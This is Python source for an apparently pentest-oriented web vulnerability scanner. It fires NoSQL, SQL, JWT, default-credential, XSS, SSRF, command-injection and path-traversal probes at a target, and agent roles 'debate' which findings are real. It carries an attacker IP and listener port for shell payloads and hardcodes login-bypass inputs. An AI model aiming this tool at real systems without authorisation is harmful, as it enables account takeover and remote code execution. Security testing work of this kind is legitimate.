#!/usr/bin/env python3
"""Enhanced Scanner with Hypothesis Debate Integration.

This scanner uses multi-agent debate to validate vulnerabilities,
eliminating false positives through hypothesis testing.
"""
from __future__ import annotations

import sys
import json
import time
from pathlib import Path
from typing import Any, Optional
from dataclasses import dataclass, field
from datetime import datetime

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from tools.hypothesis_debate import (
    HypothesisDebateSystem, 
    Hypothesis, 
    Evidence, 
    AgentRole, 
    HypothesisStatus,
    analyze_status_code
)
from tools.payload_generator import PayloadGenerator, Payload


@dataclass
class ScanProgress:
    """Track scan progress."""
    phase: str = ""
    current_test: str = ""
    tests_completed: int = 0
    tests_total: int = 0
    hypotheses_proposed: int = 0
    hypotheses_validated: int = 0
    hypotheses_refuted: int = 0
    start_time: float = field(default_factory=time.time)
    
    def print_progress(self):
        """Print current progress."""
        elapsed = time.time() - self.start_time
        pct = (self.tests_completed / self.tests_total * 100) if self.tests_total > 0 else 0
        
        print(f"\r[{elapsed:.1f}s] {self.phase}: {self.current_test} "
              f"({self.tests_completed}/{self.tests_total} = {pct:.0f}%) "
              f"| Hypotheses: {self.hypotheses_proposed} proposed, "
              f"{self.hypotheses_validated} validated, "
              f"{self.hypotheses_refuted} refuted", end="", flush=True)


class EnhancedScanner:
    """Enhanced scanner with hypothesis debate."""
    
    def __init__(
        self, 
        target_url: str,
        attacker_ip: str = "ATTACKER_IP",
        attacker_port: int = 4444,
        verbose: bool = True
    ):
        self.target_url = target_url.rstrip("/")
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.verbose = verbose
        
        # Initialize systems
        self.debate = HypothesisDebateSystem(verbose=verbose)
        self.payload_gen = PayloadGenerator()
        self.progress = ScanProgress()
        
        # Session for HTTP requests
        try:
            import requests
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            self.session = requests.Session()
            self.session.verify = False
            self.has_requests = True
        except ImportError:
            self.has_requests = False
            print("[!] requests library not available, using urllib")
    
    def _make_request(
        self, 
        method: str, 
        url: str, 
        headers: dict = None,
        data: Any = None,
        json_data: Any = None,
        timeout: int = 10
    ) -> dict:
        """Make HTTP request and return response details."""
        import time
        start = time.time()
        
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/html, */*",
        }
        if headers:
            default_headers.update(headers)
        
        result = {
            "status_code": 0,
            "headers": {},
            "body": "",
            "elapsed_ms": 0,
            "error": None,
            "analysis": None
        }
        
        try:
            if self.has_requests:
                resp = self.session.request(
                    method=method,
                    url=url,
                    headers=default_headers,
                    data=data,
                    json=json_data,
                    timeout=(timeout, timeout),
                    allow_redirects=True
                )
                result["status_code"] = resp.status_code
                result["headers"] = dict(resp.headers)
                result["body"] = resp.text[:10000]  # Limit body size
                result["elapsed_ms"] = (time.time() - start) * 1000
            else:
                import urllib.request
                import urllib.error
                req_data = json.dumps(json_data).encode() if json_data else None
                req = urllib.request.Request(url, data=req_data, headers=default_headers, method=method)
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    result["status_code"] = resp.status
                    result["headers"] = dict(resp.headers)
                    result["body"] = resp.read().decode('utf-8', errors='replace')[:10000]
                    result["elapsed_ms"] = (time.time() - start) * 1000
                    
        except Exception as e:
            result["error"] = str(e)
            result["elapsed_ms"] = (time.time() - start) * 1000
        
        # Analyze status code
        result["analysis"] = analyze_status_code(result["status_code"])
        
        return result
    
    def _print(self, msg: str):
        """Print if verbose."""
        if self.verbose:
            print(msg)
    
    def scan_with_debate(self) -> dict:
        """Perform scan with hypothesis debate."""
        self._print(f"\n{'='*70}")
        self._print(f"=== ENHANCED SCAN WITH HYPOTHESIS DEBATE ===")
        self._print(f"{'='*70}")
        self._print(f"Target: {self.target_url}")
        self._print(f"Attacker: {self.attacker_ip}:{self.attacker_port}")
        self._print(f"{'='*70}\n")
        
        results = {
            "target": self.target_url,
            "timestamp": datetime.now().isoformat(),
            "validated_vulns": [],
            "potential_vulns": [],
            "false_positives": [],
            "chains": [],
        }
        
        # Generate payloads
        self._print("[*] Phase 1: Generating Payloads...")
        self.payload_gen.generate_all(self.attacker_ip, self.attacker_port)
        total_payloads = len(self.payload_gen.generated_payloads)
        self._print(f"[+] Generated {total_payloads} payloads\n")
        
        # Test categories
        test_categories = [
            ("nosql_injection", self._test_nosql_injection),
            ("sql_injection", self._test_sql_injection),
            ("jwt", self._test_jwt),
            ("auth_bypass", self._test_auth_bypass),
            ("xss", self._test_xss),
            ("ssrf", self._test_ssrf),
            ("rce", self._test_rce),
            ("lfi", self._test_lfi),
        ]
        
        self.progress.phase = "Testing"
        self.progress.tests_total = len(test_categories)
        
        for i, (category, test_func) in enumerate(test_categories, 1):
            self.progress.current_test = category
            self.progress.tests_completed = i
            
            self._print(f"\n[*] Testing {category.upper()} ({i}/{len(test_categories)})")
            self._print("-" * 50)
            
            test_func()
        
        self._print("\n")
        
        # Final evaluation of all hypotheses
        self._print(f"\n{'='*70}")
        self._print("=== EVALUATING ALL HYPOTHESES ===")
        self._print(f"{'='*70}\n")
        
        for hyp_id, hyp in self.debate.hypotheses.items():
            evaluation = self.debate.evaluate_hypothesis(hyp_id)
            
            if evaluation["verdict"] == "VALIDATED":
                results["validated_vulns"].append({
                    "id": hyp_id,
                    "title": hyp.title,
                    "confidence": hyp.confidence,
                    "description": hyp.description,
                })
                self.progress.hypotheses_validated += 1
            elif evaluation["verdict"] in ["LIKELY", "INCONCLUSIVE"]:
                results["potential_vulns"].append({
                    "id": hyp_id,
                    "title": hyp.title,
                    "confidence": hyp.confidence,
                    "needs_verification": True,
                })
            else:
                results["false_positives"].append({
                    "id": hyp_id,
                    "title": hyp.title,
                    "reason": "Refuted by evidence analysis",
                })
                self.progress.hypotheses_refuted += 1
        
        # Print debate summary
        self.debate.print_debate_summary()
        
        # Check for chain opportunities
        chains = self._find_chains()
        results["chains"] = chains
        
        return results
    
    def _test_nosql_injection(self):
        """Test NoSQL injection with debate."""
        payloads = self.payload_gen.get_by_category("nosql_injection")
        
        login_endpoints = ["/api/v1/login", "/api/login", "/login", "/auth/login"]
        
        for endpoint in login_endpoints:
            url = f"{self.target_url}{endpoint}"
            
            for payload in payloads[:10]:  # Test first 10 payloads
                try:
                    payload_data = json.loads(payload.raw)
                except:
                    continue
                
                resp = self._make_request("POST", url, json_data=payload_data)
                
                if resp["status_code"] == 0:
                    continue
                
                # Analyze response
                status_analysis = resp["analysis"]
                body_lower = resp["body"].lower()
                
                # Propose hypothesis if interesting response
                if resp["status_code"] == 200:
                    # Create hypothesis
                    hyp = self.debate.propose_hypothesis(
                        title=f"NoSQL Injection ({payload.metadata.get('operator', 'unknown')})",
                        description=f"Endpoint {endpoint} may be vulnerable to NoSQL injection using {payload.name}",
                        proposed_by=AgentRole.VULN_HUNTER,
                        initial_evidence=Evidence(
                            type="http_response",
                            data={"status": resp["status_code"], "payload": payload.name},
                            supports_hypothesis=True,
                            confidence=0.5 + status_analysis["confidence_modifier"],
                            source_agent=AgentRole.VULN_HUNTER
                        )
                    )
                    self.progress.hypotheses_proposed += 1
                    
                    # Support/Refute based on response analysis
                    if "token" in body_lower or "jwt" in body_lower or "access_token" in body_lower:
                        self.debate.support_hypothesis(
                            hyp.id,
                            AgentRole.POC_VALIDATOR,
                            Evidence(
                                type="response_analysis",
                                data={"contains_token": True},
                                supports_hypothesis=True,
                                confidence=0.85,
                                source_agent=AgentRole.POC_VALIDATOR
                            ),
                            "Response contains authentication token - injection successful"
                        )
                    elif any(x in body_lower for x in ["<html", "<!doctype", "login", "password"]):
                        # Likely just a login page
                        self.debate.refute_hypothesis(
                            hyp.id,
                            AgentRole.DEVIL_ADVOCATE,
                            Evidence(
                                type="response_analysis",
                                data={"is_login_page": True},
                                supports_hypothesis=False,
                                confidence=0.7,
                                source_agent=AgentRole.DEVIL_ADVOCATE
                            ),
                            "Response is login page HTML, not auth data - FALSE POSITIVE"
                        )
                    
                    # Devil's advocate check
                    self.debate.devils_advocate_check(hyp.id)
    
    def _test_sql_injection(self):
        """Test SQL injection with debate."""
        payloads = self.payload_gen.get_by_category("sql_injection")
        
        # Test on various endpoints
        test_endpoints = [
            ("/api/users", "id"),
            ("/api/products", "id"),
            ("/search", "q"),
            ("/api/v1/users", "user_id"),
        ]
        
        for endpoint, param in test_endpoints:
            for payload in payloads[:8]:  # Limit tests
                url = f"{self.target_url}{endpoint}?{param}={payload.encoded_variants['url']}"
                resp = self._make_request("GET", url)
                
                if resp["status_code"] == 0:
                    continue
                
                # Check for SQL error indicators
                sql_errors = ["sql", "mysql", "sqlite", "postgresql", "syntax error", "ora-"]
                body_lower = resp["body"].lower()
                
                if any(err in body_lower for err in sql_errors):
                    hyp = self.debate.propose_hypothesis(
                        title=f"SQL Injection ({payload.metadata.get('type', 'unknown')})",
                        description=f"SQL error detected at {endpoint} with {payload.name}",
                        proposed_by=AgentRole.VULN_HUNTER,
                        initial_evidence=Evidence(
                            type="error_message",
                            data={"contains_sql_error": True, "status": resp["status_code"]},
                            supports_hypothesis=True,
                            confidence=0.8,
                            source_agent=AgentRole.VULN_HUNTER
                        )
                    )
                    self.progress.hypotheses_proposed += 1
                    
                    # Support with specific error
                    for err in sql_errors:
                        if err in body_lower:
                            self.debate.support_hypothesis(
                                hyp.id,
                                AgentRole.EXPLOIT_DEV,
                                Evidence(
                                    type="error_analysis",
                                    data={"error_type": err},
                                    supports_hypothesis=True,
                                    confidence=0.75,
                                    source_agent=AgentRole.EXPLOIT_DEV
                                ),
                                f"Database error '{err}' confirms SQL injection"
                            )
                            break
                
                # Time-based detection
                if "sleep" in payload.name and resp["elapsed_ms"] > 4500:
                    hyp = self.debate.propose_hypothesis(
                        title="Time-based SQL Injection",
                        description=f"Endpoint {endpoint} showed delayed response with sleep payload",
                        proposed_by=AgentRole.VULN_HUNTER,
                        initial_evidence=Evidence(
                            type="timing",
                            data={"expected_delay": 5000, "actual_delay": resp["elapsed_ms"]},
                            supports_hypothesis=True,
                            confidence=0.85,
                            source_agent=AgentRole.VULN_HUNTER
                        )
                    )
                    self.progress.hypotheses_proposed += 1
    
    def _test_jwt(self):
        """Test JWT vulnerabilities with debate."""
        payloads = self.payload_gen.get_by_category("jwt")
        
        protected_endpoints = ["/api/v1/profile", "/api/v1/admin", "/admin", "/api/me"]
        
        for payload in payloads[:6]:
            for endpoint in protected_endpoints:
                url = f"{self.target_url}{endpoint}"
                resp = self._make_request("GET", url, headers={
                    "Authorization": f"Bearer {payload.raw}"
                })
                
                if resp["status_code"] == 0:
                    continue
                
                body_lower = resp["body"].lower()
                
                if resp["status_code"] == 200:
                    # Check for false positive indicators
                    is_login_page = any(x in body_lower for x in [
                        "<title>log in", "login form", "wp-login", "sign in"
                    ])
                    
                    is_actual_data = False
                    try:
                        json_resp = json.loads(resp["body"])
                        if isinstance(json_resp, dict) and any(
                            k in json_resp for k in ["user", "email", "id", "profile"]
                        ):
                            is_actual_data = True
                    except:
                        pass
                    
                    hyp = self.debate.propose_hypothesis(
                        title=f"JWT Algorithm Confusion ({payload.metadata.get('header', {}).get('alg', 'unknown')})",
                        description=f"Endpoint {endpoint} accepted forged JWT token",
                        proposed_by=AgentRole.VULN_HUNTER,
                        initial_evidence=Evidence(
                            type="http_response",
                            data={"status": 200, "token": payload.raw[:50]},
                            supports_hypothesis=True,
                            confidence=0.6,
                            source_agent=AgentRole.VULN_HUNTER
                        )
                    )
                    self.progress.hypotheses_proposed += 1
                    
                    if is_actual_data:
                        self.debate.support_hypothesis(
                            hyp.id,
                            AgentRole.POC_VALIDATOR,
                            Evidence(
                                type="data_access",
                                data={"contains_user_data": True},
                                supports_hypothesis=True,
                                confidence=0.9,
                                source_agent=AgentRole.POC_VALIDATOR
                            ),
                            "Response contains actual user data JSON - CONFIRMED"
                        )
                    elif is_login_page:
                        self.debate.refute_hypothesis(
                            hyp.id,
                            AgentRole.DEVIL_ADVOCATE,
                            Evidence(
                                type="response_analysis",
                                data={"is_login_page": True},
                                supports_hypothesis=False,
                                confidence=0.85,
                                source_agent=AgentRole.DEVIL_ADVOCATE
                            ),
                            "200 response is just login redirect page - FALSE POSITIVE"
                        )
                    else:
                        self.debate.devils_advocate_check(hyp.id)
    
    def _test_auth_bypass(self):
        """Test authentication bypass."""
        payloads = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": ""},
            {"username": "admin", "password": {"$gt": ""}},
            {"username": "root", "password": "root"},
            {"email": "admin@localhost", "password": "password"},
        ]
        
        for payload in payloads:
            for endpoint in ["/api/v1/login", "/login", "/auth/login"]:
                url = f"{self.target_url}{endpoint}"
                resp = self._make_request("POST", url, json_data=payload)
                
                if resp["status_code"] == 200 and "token" in resp["body"].lower():
                    hyp = self.debate.propose_hypothesis(
                        title="Authentication Bypass",
                        description=f"Weak/default credentials accepted at {endpoint}",
                        proposed_by=AgentRole.VULN_HUNTER,
                        initial_evidence=Evidence(
                            type="auth_success",
                            data={"payload": str(payload), "got_token": True},
                            supports_hypothesis=True,
                            confidence=0.8,
                            source_agent=AgentRole.VULN_HUNTER
                        )
                    )
                    self.progress.hypotheses_proposed += 1
    
    def _test_xss(self):
        """Test XSS with debate."""
        payloads = self.payload_gen.get_by_category("xss")
        
        for payload in payloads[:5]:
            url = f"{self.target_url}/search?q={payload.encoded_variants['url']}"
            resp = self._make_request("GET", url)
            
            if payload.raw in resp["body"]:
                hyp = self.debate.propose_hypothesis(
                    title=f"Reflected XSS ({payload.name})",
                    description=f"XSS payload reflected in response",
                    proposed_by=AgentRole.VULN_HUNTER,
                    initial_evidence=Evidence(
                        type="reflection",
                        data={"payload_reflected": True},
                        supports_hypothesis=True,
                        confidence=0.75,
                        source_agent=AgentRole.VULN_HUNTER
                    )
                )
                self.progress.hypotheses_proposed += 1
    
    def _test_ssrf(self):
        """Test SSRF with debate."""
        payloads = self.payload_gen.get_by_category("ssrf")
        
        for payload in payloads[:5]:
            for param in ["url", "redirect", "next"]:
                url = f"{self.target_url}/?{param}={payload.encoded_variants['url']}"
                resp = self._make_request("GET", url)
                
                if any(x in resp["body"].lower() for x in ["ami-id", "metadata", "169.254"]):
                    hyp = self.debate.propose_hypothesis(
                        title=f"SSRF ({payload.name})",
                        description=f"Internal resource accessed via SSRF",
                        proposed_by=AgentRole.VULN_HUNTER,
                        initial_evidence=Evidence(
                            type="internal_access",
                            data={"target": payload.raw},
                            supports_hypothesis=True,
                            confidence=0.9,
                            source_agent=AgentRole.VULN_HUNTER
                        )
                    )
                    self.progress.hypotheses_proposed += 1
    
    def _test_rce(self):
        """Test RCE with debate."""
        payloads = self.payload_gen.get_by_category("rce")
        
        for payload in payloads[:5]:
            if "sleep" in payload.name:
                for param in ["cmd", "exec", "command"]:
                    url = f"{self.target_url}/?{param}={payload.encoded_variants['url']}"
                    resp = self._make_request("GET", url)
                    
                    if resp["elapsed_ms"] > 4500:
                        hyp = self.debate.propose_hypothesis(
                            title="Remote Code Execution (Time-based)",
                            description=f"Command injection causing delayed response",
                            proposed_by=AgentRole.VULN_HUNTER,
                            initial_evidence=Evidence(
                                type="timing",
                                data={"delay": resp["elapsed_ms"]},
                                supports_hypothesis=True,
                                confidence=0.85,
                                source_agent=AgentRole.VULN_HUNTER
                            )
                        )
                        self.progress.hypotheses_proposed += 1
    
    def _test_lfi(self):
        """Test LFI with debate."""
        payloads = self.payload_gen.get_by_category("lfi")
        
        for payload in payloads[:5]:
            for param in ["file", "page", "path", "template"]:
                url = f"{self.target_url}/?{param}={payload.encoded_variants['url']}"
                resp = self._make_request("GET", url)
                
                if any(x in resp["body"] for x in ["root:", "/bin/bash", "[extensions]"]):
                    hyp = self.debate.propose_hypothesis(
                        title=f"Local File Inclusion",
                        description=f"System file read via path traversal",
                        proposed_by=AgentRole.VULN_HUNTER,
                        initial_evidence=Evidence(
                            type="file_content",
                            data={"target": payload.metadata.get("target_file")},
                            supports_hypothesis=True,
                            confidence=0.9,
                            source_agent=AgentRole.VULN_HUNTER
                        )
                    )
                    self.progress.hypotheses_proposed += 1
    
    def _find_chains(self) -> list[dict]:
        """Find potential vulnerability chains."""
        chains = []
        validated = self.debate.get_validated_hypotheses()
        
        # Look for chain opportunities
        nosql_vulns = [h for h in validated if "nosql" in h.title.lower()]
        jwt_vulns = [h for h in validated if "jwt" in h.title.lower()]
        auth_vulns = [h for h in validated if "auth" in h.title.lower()]
        rce_vulns = [h for h in validated if "rce" in h.title.lower()]
        
        # NoSQL → Auth bypass → Admin access
        if nosql_vulns and jwt_vulns:
            chain = {
                "name": "Auth Chain",
                "steps": [nosql_vulns[0].id, jwt_vulns[0].id],
                "description": "NoSQL injection to obtain token → JWT manipulation for privilege escalation",
            }
            chains.append(chain)
            self.debate.suggest_chain(
                nosql_vulns[0].id,
                jwt_vulns[0].id,
                AgentRole.EXPLOIT_DEV,
                "Chain NoSQL injection with JWT manipulation for full auth bypass"
            )
        
        # Auth bypass → RCE
        if auth_vulns and rce_vulns:
            chain = {
                "name": "Auth to RCE Chain",
                "steps": [auth_vulns[0].id, rce_vulns[0].id],
                "description": "Authentication bypass → Admin access → RCE",
            }
            chains.append(chain)
        
        return chains


def main():
    """Main entry point."""
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python enhanced_scanner.py <target_url> [attacker_ip] [port]")
        print("Example: python enhanced_scanner.py https://target.com 10.10.14.5 4444")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker_ip = sys.argv[2] if len(sys.argv) > 2 else "10.10.14.5"
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
    
    scanner = EnhancedScanner(
        target_url=target,
        attacker_ip=attacker_ip,
        attacker_port=port,
        verbose=True
    )
    
    results = scanner.scan_with_debate()
    
    # Save results
    output_file = Path(f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[+] Results saved to: {output_file}")
    
    # Export debate
    debate_file = Path(f"debate_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    scanner.debate.export_debate(str(debate_file))
    print(f"[+] Debate log saved to: {debate_file}")


if __name__ == "__main__":
    main()
